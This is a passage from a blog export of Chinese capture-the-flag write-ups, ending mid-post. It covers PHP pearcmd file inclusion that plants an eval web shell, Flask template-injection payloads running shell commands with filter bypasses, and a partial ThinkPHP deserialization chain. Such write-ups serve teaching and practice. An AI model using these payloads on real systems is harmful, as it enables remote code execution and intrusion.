html--><blockquote>末尾处会会在/tmp目录下面生成一个a.php文件，然后我们再去包含一下这个文件，因为我们再这个a.php中内嵌了一个&lt;?=eval($_POST[_]);?&gt;<br> 所以需要访问这个文件，然后在post中传入远程命令</blockquote><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/1%7B8ZU(7FB%7BQWQZHTS%5B%5DV7%7DJ.png' /><!--kg-card-end: html--><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/124354uyjfhgfv.png' /><!--kg-card-end: html--><blockquote>然后获得flag</blockquote><p></p><p></p><p></p><p></p>",
                        "comment_id": "63763e6ef7e27b274c0bdcfa",
                        "plaintext": "0、知识点与工具\n\npecl/pear中的pearcmd.php\n\n文件包含\n\n工具burpsuite\n\n\n\n1、关于pearcmd.php\n\n7.4及以后，需要我们在编译PHP的时候指定--with-pear才会安装。\n\npecl是PHP中用于管理扩展而使用的命令行工具，pear是pecl的依赖库\n在Docker任意版镜像中，都会被默认安装，路径为：/usr/local/lib/php，\n而pearcmd.php就在这个路径中：/usr/local/lib/php/pearcmd.php\n\n详细了解可以看看这个\n\nDocker PHP裸文件本地包含综述 | 离别歌phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。离别歌phithon\n\n\n\n\n2、解题\n\n其中config-create是pear中的参数，他的作用是：会把第一个参数的内容写入第二个参数所指定的文件中，然后就可以构造playload\n\n/?+config-create+/&file=/usr/local/lib/php/pearcmd&/<?=eval($_POST[_]);?>+/tmp/a.php\n\n末尾处会会在/tmp目录下面生成一个a.php文件，然后我们再去包含一下这个文件，因为我们再这个a.php中内嵌了一个<?=eval($_POST[_]);?>\n所以需要访问这个文件，然后在post中传入远程命令\n\n然后获得flag\n\n\n\n\n\n\n\n",
                        "feature_image": "__GHOST_URL__/content/images/2022/11/7a45667543f1bbd50dee794bc1be6d7c.png",
                        "featured": 0,
                        "type": "post",
                        "status": "published",
                        "locale": null,
                        "visibility": "public",
                        "email_recipient_filter": "all",
                        "created_at": "2022-11-17T14:00:14.000Z",
                        "updated_at": "2022-11-18T06:19:24.000Z",
                        "published_at": "2022-11-18T06:19:24.000Z",
                        "custom_excerpt": null,
                        "codeinjection_head": null,
                        "codeinjection_foot": null,
                        "custom_template": null,
                        "canonical_url": null,
                        "newsletter_id": null
                    },
                    {
                        "id": "63779472f7e27b274c0bdd9c",
                        "uuid": "a62f5186-1b7d-43ec-8e69-d690bbecb2d7",
                        "title": "Week3 BabySSTI_One 200",
                        "slug": "week3-2",
                        "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}]],\"cards\":[[\"code\",{\"code\":\"# 首先导入这个框架\\nfrom flask import Flask\\napp = Flask(__name__)\\n\\n# route表示网址访问url，这是/表示这里是网址的主入口\\n@app.route('/')\\ndef hello_world():\\n\\t# 然后会返回一个字符串\\n   return 'Hello World'\\n   \\n   \\n   \\n# 改变一下让其返回一个页面\\n@app.route('/')\\ndef hello_world():\\n\\n# 这里就会放回hello,html页面，不过hello.html必须放在templates文件夹\\n# 因为render_template('hello.html')== render_template('./templates/hello.html')\\n   return render_template('hello.html')\\n\\n\\n\\n# 在改变一下加入一个模板变量\\n@app.route('/')\\ndef hello_world():\\n\\t\\n    # 定义一个变量，用于让他展示在html页面上\\n    str = 'Hello'\\n    \\n\\t# 然后会返回一个字符串\\n   return render_template('hello.html',str=str)\\n   \\n   # 然后就需要在hello.html中使用这个变量\\n   # <body>\\n   #\\t{{str}}\\n   # </body>\\n   # 然后html中就会显示这个变量的值\\n   \\n   \\n\\n# 那么要处理用户传入的参数就得这么写\\n@app.route('/')\\ndef hello_world():\\n    id = request.args.get('id')\\n    return render_template('hello.html',id=id)\\n \\n\\nif __name__ == '__main__':\\n   app.run()\",\"language\":\"python\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221118225530.png' />\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/)LU%7BJ3Z%5BOB%5D3%5BK2%604_0QKNN.png' />\"}],[\"markdown\",{\"markdown\":\"> 在Python的环境中，一般能够协助我们进行远程代码执行可能会想到system()(这里用不到)、还有OS模块(这玩意可以操作文件和目录)，但这里并不能直接使用到，所以得另辟蹊径，\\n\\n- 因为Python也有对象的概念，因为object是所有类的基类，在没有指定哪个类继承哪个类的情况下，则默认继承object类\\n    - 然后我们可以先传入一个参数，然后通过__class__获取这个参数的基本类类型\\n    - 然后在通过__bases__获取这个基本类的父类,也就是object类\\n    - 然后在通过__subclass__()魔术方法获取object类的所有子类\\n    - 然后在子类中找到关于os模块的类\\n    - 然后在使用__init__将其初始化\\n\\n\\n```\\n每个类都有的_ _ class _ _,表示当前类\\nprint(''.__class__)//获取当前对象所使用的类，此处为字符串\\nprint(().__class__)//元组\\nprint([].__class__)//列表\\nprint({}.__class__)//字典\\n\\n\\n\\n每一个类都有一个_ _ bases _ _属性，列出其基类\\nprint(''.__class__.__bases__)//base不加s输出当前父类，加s输出所有的父类(元组)\\n\\n获取子类集合\\nprint(''.__class__.__bases__[0].__subclasses__())\\nprint(len(''.__class__.__bases__[0].__subclasses__()))//类的个数\\n\\n\\n```\"}],[\"code\",{\"code\":\"/?name={{1['__cl'+'ass__']['__bas'+'es__'][0]['__subcl'+'asses__']()}}\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/dfhdfhdshdhdfhdf.png' />\"}],[\"code\",{\"code\":\"?name={{''['__cla'+'ss__']['__bas'+'es__'][0]['__subcl'+'asses__']()[117]['__in'+'it__'].__globals__['popen']('ls /').read()}}\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/4HXT49%60TMY@Q)4I66YC_R0N.png' />\"}],[\"code\",{\"code\":\"?name={{''['__cla'+'ss__']['__bas'+'es__'][0]['__subcl'+'asses__']()[117]['__in'+'it__'].__globals__['popen']('tail /fla*').read()}}\\n\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221119151042.png' />\"}],[\"markdown\",{\"markdown\":\"- 如果flag是在配置文件中那么可以直接传入 【{{config}}】就阔以拿到\\n- 如果被过滤掉引号，那么可以使用http_get\\n    - ```\\n        ?name={{().__class__.mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(request.args.func)(request.args.cmd).read()}}&func=popen&cmd=dir\\n\\n      ```\\n    - \"}],[\"code\",{\"code\":\"原payload:\\nprint(''.__class__.__bases__[0].__subclasses__())\\nprint(''.__class__.__mro__[1].__subclasses__())\\n如果后端对[]进行了过滤\\nprint(''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138))\\nprint(''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__)\\nprint(''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get('popen')('dir').read())\\nprint(''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get('__builtins__').get('open')('flag.txt').read())//get()方式绕过\"}],[\"code\",{\"code\":\"git clone https://github.com/epinna/tplmap.git\\npip install -r requirements.txt\\npython tplmap.py -u\"}],[\"bookmark\",{\"url\":\"https://www.cnblogs.com/willing-sir/p/16097734.html\",\"metadata\":{\"url\":\"https://www.cnblogs.com/willing-sir/p/16097734.html\",\"title\":\"SSTI模板注入学习笔记---Flask - willing-sir - 博客园\",\"description\":\"SSTI模板注入Flask 这里主要介绍Flask模板下实现模板注入，以及利用简单python语法实现本地SSTI靶场的快速搭建，意在形成基本的利用模板注入漏洞思维。后续会整理其他模板下的注入利用方式\",\"author\":null,\"publisher\":\"博客园\",\"thumbnail\":\"https://common.cnblogs.com/logo.svg\",\"icon\":\"https://common.cnblogs.com/favicon.svg\"}}],[\"bookmark\",{\"url\":\"https://www.freebuf.com/articles/web/279670.html\",\"metadata\":{\"url\":\"https://www.freebuf.com/articles/web/279670.html\",\"title\":\"从0到1:Flask SSTI(服务器模板注入) - FreeBuf网络安全行业门户\",\"description\":\"Flask是运行在虚拟环境(VirtualEnv)中的,VirtualEnv是一个虚拟的Python环境构建器。它可以帮助用户并行创建多个Python环境.因此,它可以避免不同版本的库之间的兼容性问题.\",\"author\":\"2021-07-06 13:40:00\",\"publisher\":\"freeBuf\",\"thumbnail\":\"https://www.freebuf.com/images/logoMax.png\",\"icon\":\"https://www.freebuf.com/favicon.ico\"}}]],\"markups\":[],\"sections\":[[1,\"h4\",[[0,[],0,\"0、知识点与工具\"]]],[1,\"blockquote\",[[0,[],0,\"Flask SSTI模板注入\"]]],[1,\"blockquote\",[[0,[],0,\"远程代码执行\"]]],[1,\"blockquote\",[[0,[],0,\"Python中内置属性：__class__、__bases__、__subclass__、__init__、OS模块\"]]],[1,\"blockquote\",[[0,[],0,\"工具burpsuite\"]]],[1,\"p\",[]],[1,\"h4\",[[0,[],0,\"1、什么是SSTI模板注入\"]]],[1,\"blockquote\",[[0,[],0,\"这东西也就是服务端模板注入攻击，将用户输入的东西作为Web的应用模板的一部分，然后进行渲染执行，从而导致敏感信息泄露或者代码执行\"]]],[1,\"p\",[]],[1,\"h4\",[[0,[],0,\"2、Flask又是啥\"]]],[1,\"blockquote\",[[0,[],0,\"这玩意是一个用Python编写的Web应用程序框架\"],[1,[],0,0],[0,[],0,\" 它是运行在VirtualEnv中，而这个VirtualEnv是一个虚拟的Python环境构建器\"]]],[1,\"p\",[[0,[],0,\"这玩意是怎么使用的，来看个小案例\"]]],[10,0],[1,\"blockquote\",[[0,[],0,\"在html模板中,{{}}之间的内容会被当做表达式进行执行,并将结果输出到页面上\"]]],[1,\"blockquote\",[[0,[],0,\"然后就阔以去页面上做测试了\"]]],[1,\"h4\",[[0,[],0,\"3、尝试\"]]],[1,\"blockquote\",[[0,[],0,\"首先一进入网页的样子是这样的\"]]],[1,\"blockquote\",[[0,[],0,\"阔以看到有一个提示，叫我们尝试以get方式传入一个name参数\"]]],[10,1],[1,\"blockquote\",[[0,[],0,\"也就是说name这可以尝试模板注入，然后可以让name的值为{{2*2}}看看是否会执行出结果\"]]],[10,2],[1,\"blockquote\",[[0,[],0,\"可以发现页面发生了改变，表达式被执行，如果不存在漏洞的话，页面是会显示{{2*2}}这个字符串，并不会将2*2的结果计算出来\"]]],[1,\"h4\",[[0,[],0,\"4、解题\"]]],[10,3],[1,\"blockquote\",[[0,[],0,\"那么要进行命令执行的流程就是：获取基本类 -> 拿到基本类子类 -> 在子类中找到关于命令执行和文件读写的类，也就是os._wrap_close\"],[1,[],0,1],[0,[],0,\"然后输入一些值会发现有关键字过滤，如：class、subclass、bases、init\"],[1,[],0,2],[0,[],0,\"绕过的方法也很简单，使用拼接绕过即可\"]]],[1,\"blockquote\",[[0,[],0,\"执行这面这段就阔以获取所有子类，然后子类中找到os.wrap_close的索引位置\"]]],[10,4],[10,5],[1,\"blockquote\",[[0,[],0,\"查看一下网站根目录\"]]],[10,6],[10,7],[1,\"p\",[]],[1,\"blockquote\",[[0,[],0,\"最总执行下面代码获取flag\"]]],[10,8],[10,9],[1,\"p\",[]],[1,\"h3\",[[0,[],0,\"5、扩展\"]]],[10,10],[3,\"ul\",[[[0,[],0,\"过滤掉了方括号\"]]]],[10,11],[3,\"ul\",[[[0,[],0,\"自动化注入\"]]]],[10,12],[1,\"p\",[]],[1,\"h4\",[[0,[],0,\" 参考\"]]],[10,13],[10,14],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
                        "lexical": null,
                        "html": "<h4 id=\"0%E3%80%81%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%8E%E5%B7%A5%E5%85%B7\">0、知识点与工具</h4><blockquote>Flask SSTI模板注入</blockquote><blockquote>远程代码执行</blockquote><blockquote>Python中内置属性：__class__、__bases__、__subclass__、__init__、OS模块</blockquote><blockquote>工具burpsuite</blockquote><p></p><h4 id=\"1%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5\">1、什么是SSTI模板注入</h4><blockquote>这东西也就是服务端模板注入攻击，将用户输入的东西作为Web的应用模板的一部分，然后进行渲染执行，从而导致敏感信息泄露或者代码执行</blockquote><p></p><h4 id=\"2%E3%80%81flask%E5%8F%88%E6%98%AF%E5%95%A5\">2、Flask又是啥</h4><blockquote>这玩意是一个用Python编写的Web应用程序框架<br> 它是运行在VirtualEnv中，而这个VirtualEnv是一个虚拟的Python环境构建器</blockquote><p>这玩意是怎么使用的，来看个小案例</p><pre><code class=\"language-python\"># 首先导入这个框架\nfrom flask import Flask\napp = Flask(__name__)\n\n# route表示网址访问url，这是/表示这里是网址的主入口\n@app.route('/')\ndef hello_world():\n\t# 然后会返回一个字符串\n   return 'Hello World'\n   \n   \n   \n# 改变一下让其返回一个页面\n@app.route('/')\ndef hello_world():\n\n# 这里就会放回hello,html页面，不过hello.html必须放在templates文件夹\n# 因为render_template('hello.html')== render_template('./templates/hello.html')\n   return render_template('hello.html')\n\n\n\n# 在改变一下加入一个模板变量\n@app.route('/')\ndef hello_world():\n\t\n    # 定义一个变量，用于让他展示在html页面上\n    str = 'Hello'\n    \n\t# 然后会返回一个字符串\n   return render_template('hello.html',str=str)\n   \n   # 然后就需要在hello.html中使用这个变量\n   # &lt;body&gt;\n   #\t{{str}}\n   # &lt;/body&gt;\n   # 然后html中就会显示这个变量的值\n   \n   \n\n# 那么要处理用户传入的参数就得这么写\n@app.route('/')\ndef hello_world():\n    id = request.args.get('id')\n    return render_template('hello.html',id=id)\n \n\nif __name__ == '__main__':\n   app.run()</code></pre><blockquote>在html模板中,{{}}之间的内容会被当做表达式进行执行,并将结果输出到页面上</blockquote><blockquote>然后就阔以去页面上做测试了</blockquote><h4 id=\"3%E3%80%81%E5%B0%9D%E8%AF%95\">3、尝试</h4><blockquote>首先一进入网页的样子是这样的</blockquote><blockquote>阔以看到有一个提示，叫我们尝试以get方式传入一个name参数</blockquote><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221118225530.png' /><!--kg-card-end: html--><blockquote>也就是说name这可以尝试模板注入，然后可以让name的值为{{2*2}}看看是否会执行出结果</blockquote><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/)LU%7BJ3Z%5BOB%5D3%5BK2%604_0QKNN.png' /><!--kg-card-end: html--><blockquote>可以发现页面发生了改变，表达式被执行，如果不存在漏洞的话，页面是会显示{{2*2}}这个字符串，并不会将2*2的结果计算出来</blockquote><h4 id=\"4%E3%80%81%E8%A7%A3%E9%A2%98\">4、解题</h4><!--kg-card-begin: markdown--><blockquote>\n<p>在Python的环境中，一般能够协助我们进行远程代码执行可能会想到system()(这里用不到)、还有OS模块(这玩意可以操作文件和目录)，但这里并不能直接使用到，所以得另辟蹊径，</p>\n</blockquote>\n<ul>\n<li>因为Python也有对象的概念，因为object是所有类的基类，在没有指定哪个类继承哪个类的情况下，则默认继承object类\n<ul>\n<li>然后我们可以先传入一个参数，然后通过__class__获取这个参数的基本类类型</li>\n<li>然后在通过__bases__获取这个基本类的父类,也就是object类</li>\n<li>然后在通过__subclass__()魔术方法获取object类的所有子类</li>\n<li>然后在子类中找到关于os模块的类</li>\n<li>然后在使用__init__将其初始化</li>\n</ul>\n</li>\n</ul>\n<pre><code>每个类都有的_ _ class _ _,表示当前类\nprint(''.__class__)//获取当前对象所使用的类，此处为字符串\nprint(().__class__)//元组\nprint([].__class__)//列表\nprint({}.__class__)//字典\n\n\n\n每一个类都有一个_ _ bases _ _属性，列出其基类\nprint(''.__class__.__bases__)//base不加s输出当前父类，加s输出所有的父类(元组)\n\n获取子类集合\nprint(''.__class__.__bases__[0].__subclasses__())\nprint(len(''.__class__.__bases__[0].__subclasses__()))//类的个数\n\n\n</code></pre>\n<!--kg-card-end: markdown--><blockquote>那么要进行命令执行的流程就是：获取基本类 -&gt; 拿到基本类子类 -&gt; 在子类中找到关于命令执行和文件读写的类，也就是os._wrap_close<br>然后输入一些值会发现有关键字过滤，如：class、subclass、bases、init<br>绕过的方法也很简单，使用拼接绕过即可</blockquote><blockquote>执行这面这段就阔以获取所有子类，然后子类中找到os.wrap_close的索引位置</blockquote><pre><code>/?name={{1['__cl'+'ass__']['__bas'+'es__'][0]['__subcl'+'asses__']()}}</code></pre><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/dfhdfhdshdhdfhdf.png' /><!--kg-card-end: html--><blockquote>查看一下网站根目录</blockquote><pre><code>?name={{''['__cla'+'ss__']['__bas'+'es__'][0]['__subcl'+'asses__']()[117]['__in'+'it__'].__globals__['popen']('ls /').read()}}</code></pre><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/4HXT49%60TMY@Q)4I66YC_R0N.png' /><!--kg-card-end: html--><p></p><blockquote>最总执行下面代码获取flag</blockquote><pre><code>?name={{''['__cla'+'ss__']['__bas'+'es__'][0]['__subcl'+'asses__']()[117]['__in'+'it__'].__globals__['popen']('tail /fla*').read()}}\n</code></pre><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221119151042.png' /><!--kg-card-end: html--><p></p><h3 id=\"5%E3%80%81%E6%89%A9%E5%B1%95\">5、扩展</h3><!--kg-card-begin: markdown--><ul>\n<li>如果flag是在配置文件中那么可以直接传入 【{{config}}】就阔以拿到</li>\n<li>如果被过滤掉引号，那么可以使用http_get\n<ul>\n<li>\n<pre><code>  ?name={{().__class__.mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(request.args.func)(request.args.cmd).read()}}&amp;func=popen&amp;cmd=dir\n\n</code></pre>\n</li>\n<li></li>\n</ul>\n</li>\n</ul>\n<!--kg-card-end: markdown--><ul><li>过滤掉了方括号</li></ul><pre><code>原payload:\nprint(''.__class__.__bases__[0].__subclasses__())\nprint(''.__class__.__mro__[1].__subclasses__())\n如果后端对[]进行了过滤\nprint(''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138))\nprint(''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__)\nprint(''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get('popen')('dir').read())\nprint(''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get('__builtins__').get('open')('flag.txt').read())//get()方式绕过</code></pre><ul><li>自动化注入</li></ul><pre><code>git clone https://github.com/epinna/tplmap.git\npip install -r requirements.txt\npython tplmap.py -u</code></pre><p></p><h4 id=\"%E5%8F%82%E8%80%83\"> 参考</h4><figure class=\"kg-card kg-bookmark-card\"><a class=\"kg-bookmark-container\" href=\"https://www.cnblogs.com/willing-sir/p/16097734.html\"><div class=\"kg-bookmark-content\"><div class=\"kg-bookmark-title\">SSTI模板注入学习笔记---Flask - willing-sir - 博客园</div><div class=\"kg-bookmark-description\">SSTI模板注入Flask 这里主要介绍Flask模板下实现模板注入，以及利用简单python语法实现本地SSTI靶场的快速搭建，意在形成基本的利用模板注入漏洞思维。后续会整理其他模板下的注入利用方式</div><div class=\"kg-bookmark-metadata\"><img class=\"kg-bookmark-icon\" src=\"https://common.cnblogs.com/favicon.svg\" alt=\"\"><span class=\"kg-bookmark-author\">博客园</span></div></div><div class=\"kg-bookmark-thumbnail\"><img src=\"https://common.cnblogs.com/logo.svg\" alt=\"\"></div></a></figure><figure class=\"kg-card kg-bookmark-card\"><a class=\"kg-bookmark-container\" href=\"https://www.freebuf.com/articles/web/279670.html\"><div class=\"kg-bookmark-content\"><div class=\"kg-bookmark-title\">从0到1:Flask SSTI(服务器模板注入) - FreeBuf网络安全行业门户</div><div class=\"kg-bookmark-description\">Flask是运行在虚拟环境(VirtualEnv)中的,VirtualEnv是一个虚拟的Python环境构建器。它可以帮助用户并行创建多个Python环境.因此,它可以避免不同版本的库之间的兼容性问题.</div><div class=\"kg-bookmark-metadata\"><img class=\"kg-bookmark-icon\" src=\"https://www.freebuf.com/favicon.ico\" alt=\"\"><span class=\"kg-bookmark-author\">freeBuf</span><span class=\"kg-bookmark-publisher\">2021-07-06 13:40:00</span></div></div><div class=\"kg-bookmark-thumbnail\"><img src=\"https://www.freebuf.com/images/logoMax.png\" alt=\"\"></div></a></figure>",
                        "comment_id": "63779472f7e27b274c0bdd9c",
                        "plaintext": "0、知识点与工具\n\nFlask SSTI模板注入\n\n远程代码执行\n\nPython中内置属性：__class__、__bases__、__subclass__、__init__、OS模块\n\n工具burpsuite\n\n\n\n1、什么是SSTI模板注入\n\n这东西也就是服务端模板注入攻击，将用户输入的东西作为Web的应用模板的一部分，然后进行渲染执行，从而导致敏感信息泄露或者代码执行\n\n\n\n2、Flask又是啥\n\n这玩意是一个用Python编写的Web应用程序框架\n它是运行在VirtualEnv中，而这个VirtualEnv是一个虚拟的Python环境构建器\n\n这玩意是怎么使用的，来看个小案例\n\n# 首先导入这个框架\nfrom flask import Flask\napp = Flask(__name__)\n\n# route表示网址访问url，这是/表示这里是网址的主入口\n@app.route('/')\ndef hello_world():\n\t# 然后会返回一个字符串\n   return 'Hello World'\n   \n   \n   \n# 改变一下让其返回一个页面\n@app.route('/')\ndef hello_world():\n\n# 这里就会放回hello,html页面，不过hello.html必须放在templates文件夹\n# 因为render_template('hello.html')== render_template('./templates/hello.html')\n   return render_template('hello.html')\n\n\n\n# 在改变一下加入一个模板变量\n@app.route('/')\ndef hello_world():\n\t\n    # 定义一个变量，用于让他展示在html页面上\n    str = 'Hello'\n    \n\t# 然后会返回一个字符串\n   return render_template('hello.html',str=str)\n   \n   # 然后就需要在hello.html中使用这个变量\n   # <body>\n   #\t{{str}}\n   # </body>\n   # 然后html中就会显示这个变量的值\n   \n   \n\n# 那么要处理用户传入的参数就得这么写\n@app.route('/')\ndef hello_world():\n    id = request.args.get('id')\n    return render_template('hello.html',id=id)\n \n\nif __name__ == '__main__':\n   app.run()\n\n在html模板中,{{}}之间的内容会被当做表达式进行执行,并将结果输出到页面上\n\n然后就阔以去页面上做测试了\n\n3、尝试\n\n首先一进入网页的样子是这样的\n\n阔以看到有一个提示，叫我们尝试以get方式传入一个name参数\n\n也就是说name这可以尝试模板注入，然后可以让name的值为{{2*2}}看看是否会执行出结果\n\n可以发现页面发生了改变，表达式被执行，如果不存在漏洞的话，页面是会显示{{2*2}}这个字符串，并不会将2*2的结果计算出来\n\n4、解题\n\n\n\n\n在Python的环境中，一般能够协助我们进行远程代码执行可能会想到system()(这里用不到)、还有OS模块(这玩意可以操作文件和目录)，但这里并不能直接使用到，所以得另辟蹊径，\n\n\n\n * 因为Python也有对象的概念，因为object是所有类的基类，在没有指定哪个类继承哪个类的情况下，则默认继承object类\n   \n   * 然后我们可以先传入一个参数，然后通过__class__获取这个参数的基本类类型\n   * 然后在通过__bases__获取这个基本类的父类,也就是object类\n   * 然后在通过__subclass__()魔术方法获取object类的所有子类\n   * 然后在子类中找到关于os模块的类\n   * 然后在使用__init__将其初始化\n   \n\n\n每个类都有的_ _ class _ _,表示当前类\nprint(''.__class__)//获取当前对象所使用的类，此处为字符串\nprint(().__class__)//元组\nprint([].__class__)//列表\nprint({}.__class__)//字典\n\n\n\n每一个类都有一个_ _ bases _ _属性，列出其基类\nprint(''.__class__.__bases__)//base不加s输出当前父类，加s输出所有的父类(元组)\n\n获取子类集合\nprint(''.__class__.__bases__[0].__subclasses__())\nprint(len(''.__class__.__bases__[0].__subclasses__()))//类的个数\n\n\n\n\n\n那么要进行命令执行的流程就是：获取基本类 -> 拿到基本类子类 -> 在子类中找到关于命令执行和文件读写的类，也就是os._wrap_close\n然后输入一些值会发现有关键字过滤，如：class、subclass、bases、init\n绕过的方法也很简单，使用拼接绕过即可\n\n执行这面这段就阔以获取所有子类，然后子类中找到os.wrap_close的索引位置\n\n/?name={{1['__cl'+'ass__']['__bas'+'es__'][0]['__subcl'+'asses__']()}}\n\n查看一下网站根目录\n\n?name={{''['__cla'+'ss__']['__bas'+'es__'][0]['__subcl'+'asses__']()[117]['__in'+'it__'].__globals__['popen']('ls /').read()}}\n\n\n\n最总执行下面代码获取flag\n\n?name={{''['__cla'+'ss__']['__bas'+'es__'][0]['__subcl'+'asses__']()[117]['__in'+'it__'].__globals__['popen']('tail /fla*').read()}}\n\n\n\n\n\n5、扩展\n\n * 如果flag是在配置文件中那么可以直接传入 【{{config}}】就阔以拿到\n * 如果被过滤掉引号，那么可以使用http_get\n   \n   * \n     \n     \n       ?name={{().__class__.mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(request.args.func)(request.args.cmd).read()}}&func=popen&cmd=dir\n     \n     \n     \n   \n   * \n   \n\n\n * 过滤掉了方括号\n\n原payload:\nprint(''.__class__.__bases__[0].__subclasses__())\nprint(''.__class__.__mro__[1].__subclasses__())\n如果后端对[]进行了过滤\nprint(''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138))\nprint(''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__)\nprint(''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get('popen')('dir').read())\nprint(''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get('__builtins__').get('open')('flag.txt').read())//get()方式绕过\n\n * 自动化注入\n\ngit clone https://github.com/epinna/tplmap.git\npip install -r requirements.txt\npython tplmap.py -u\n\n\n\n参考\n\nSSTI模板注入学习笔记---Flask - willing-sir - 博客园SSTI模板注入Flask 这里主要介绍Flask模板下实现模板注入，以及利用简单python语法实现本地SSTI靶场的快速搭建，意在形成基本的利用模板注入漏洞思维。后续会整理其他模板下的注入利用方式博客园从0到1:Flask SSTI(服务器模板注入) - FreeBuf网络安全行业门户Flask是运行在虚拟环境(VirtualEnv)中的,VirtualEnv是一个虚拟的Python环境构建器。它可以帮助用户并行创建多个Python环境.因此,它可以避免不同版本的库之间的兼容性问题.freeBuf2021-07-06 13:40:00",
                        "feature_image": "__GHOST_URL__/content/images/2022/11/504c38662c5107b7a08c8e8a4544b479.png",
                        "featured": 0,
                        "type": "post",
                        "status": "published",
                        "locale": null,
                        "visibility": "public",
                        "email_recipient_filter": "all",
                        "created_at": "2022-11-18T14:19:30.000Z",
                        "updated_at": "2022-11-19T07:51:13.000Z",
                        "published_at": "2022-11-19T07:51:13.000Z",
                        "custom_excerpt": null,
                        "codeinjection_head": null,
                        "codeinjection_foot": null,
                        "custom_template": null,
                        "canonical_url": null,
                        "newsletter_id": null
                    },
                    {
                        "id": "63798e87f7e27b274c0bdf80",
                        "uuid": "5b288ad8-aeb2-4196-a6ef-ad3842734533",
                        "title": "Week3 Maybe You Have To think More",
                        "slug": "week3-maybe-you-have-to-think-more",
                        "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"image\",{\"src\":\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221119233727.png\",\"alt\":\"img\"}],[\"code\",{\"code\":\"O:17:\\\"first\\\\second\\\\user\\\":2:{s:8:\\\"username\\\";s:1:\\\"s\\\";s:8:\\\"password\\\";N;}\\n\"}],[\"image\",{\"src\":\"https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221119234621.png\",\"alt\":\"img\"}],[\"code\",{\"code\":\"<?php\\nnamespace think;\\nabstract class Model\\n{\\n\\tprotected $append = [];\\n\\tprivate $data = [];\\n    // 这里是定义后门的地方\\n\\tfunction __construct()\\n\\t{\\n        // 新增一个get参数xyy\\n\\t\\t$this->append = [\\\"xyy\\\"=>[\\\"hello\\\",\\\"world\\\"]];\\n\\t\\t$this->data = array('xyy'=>new Request());\\n\\t}\\n}\\nclass Request\\n{\\n\\tprotected $hook = [];\\n\\tprotected $filter;\\n\\tprotected $config = [\\n\\t// 表单请求类型伪装变量\\n\\t'var_method'       => '_method',\\n\\t// 表单ajax伪装变量\\n\\t'var_ajax'         => '_ajax',\\n\\t// 表单pjax伪装变量\\n\\t'var_pjax'         => '_pjax',\\n\\t// PATHINFO变量名 用于兼容模式\\n\\t'var_pathinfo'     => 's',\\n\\t// 兼容PATH_INFO获取\\n\\t'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],\\n\\t// 默认全局过滤方法 用逗号分隔多个\\n\\t'default_filter'   => '',\\n\\t// 域名根，如thinkphp.cn\\n\\t'url_domain_root'  => '',\\n\\t// HTTPS代理标识\\n\\t'https_agent_name' => '',\\n\\t// IP代理获取标识\\n\\t'http_agent_ip'    => 'HTTP_X_REAL_IP',\\n\\t// URL伪静态后缀\\n\\t'url_html_suffix'  => 'html',\\n\\t];\\n\\tfunction __construct()\\n\\t{\\n\\t\\t$this->filter = \\\"system\\\";\\n\\t\\t$this->config = [\\\"var_ajax\\\"=>''];\\n\\t\\t$this->hook = [\\\"visible\\\"=>[$this,\\\"isAjax\\\"]];\\n\\t}\\n}\\nnamespace think\\\\process\\\\pipes;\\nuse think\\\\model\\\\concern\\\\Conversion;\\nuse think\\\\model\\\\Pivot;\\nclass Windows\\n{\\n\\tprivate $files = [];\\n\\tpublic function __construct()\\n\\t{\\n\\t\\t$this->files=[new Pivot()];\\n\\t}\\n}\\nnamespace think\\\\model;\\nuse think\\\\Model;\\nclass Pivot extends Model\\n{\\n}\\nuse think\\\\process\\\\pipes\\\\Windows;\\necho base64_encode(serialize(new 